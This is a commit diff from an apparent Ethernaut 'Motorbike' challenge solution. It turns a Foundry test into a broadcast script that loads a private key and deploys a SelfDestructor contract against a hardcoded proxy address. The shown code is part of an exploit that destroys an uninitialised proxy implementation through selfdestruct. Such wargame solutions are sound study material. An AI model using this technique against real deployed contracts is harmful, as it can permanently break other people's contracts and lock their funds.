5c11cbeb02783bcc82b3bd61c7e9c36da25b911a
Maurizio Murru <maurizio.murru93@gmail.com>
2023-07-02 16:24:52 +0200

    Motorbike challenge completed.

--- Motorbike/script/Motorbike.s.sol
+++ Motorbike/script/Motorbike.s.sol
@@ -2,15 +2,15 @@
 pragma solidity <0.7.0;
 pragma experimental ABIEncoderV2;
 
-import "forge-std/Test.sol";
+import "forge-std/Script.sol";
 import "../src/Motorbike.sol";
 import "../src/SelfDestructor.sol";
 
-contract MotorBikeTest is Test {
+contract MotorBikeScript is Script {
     address payable motorbikeAddress = payable(0x1E15774bAc3CbCd7f9EDfDA65a6A8cd52cFc73EE);
     bytes32 constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
-    function test() external {
+    function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
         SelfDestructor selfDestructor = new SelfDestructor();
--- Motorbike/src/SelfDestructor.sol
+++ Motorbike/src/SelfDestructor.sol
@@ -4,10 +4,4 @@ contract SelfDestructor {
     function destroy(address payable _address) public {
         selfdestruct(_address);
     }
-    receive() external payable {
-        selfdestruct(msg.sender);
-    }
-    fallback() external payable {
-        selfdestruct(msg.sender);
-    }
 }
